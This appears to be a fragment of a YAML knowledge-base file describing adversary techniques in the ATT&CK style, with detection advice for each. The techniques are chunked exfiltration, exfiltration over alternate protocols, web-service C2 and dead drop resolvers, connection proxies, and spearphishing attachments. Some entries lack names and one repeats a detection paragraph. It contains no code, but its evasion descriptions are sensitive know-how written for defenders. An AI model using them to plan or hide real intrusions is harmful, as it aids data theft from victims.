        An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.

        Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

      description: |-
        Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage.

        Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

      description: |-
        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.

        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

        Detection: Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

      name: Connection Proxy
      description: |-
        A connection proxy is used to direct network traffic between systems or act as an intermediary for network communications. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools)

        The definition of a proxy can also be expanded out to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.

        The network may be within a single organization or across organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.

        Detection: Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.

        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another).

        Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

      name: Spearphishing Attachment
      description: |-
        Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution.

        There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.

        Detection: Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

        Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution and Scripting.
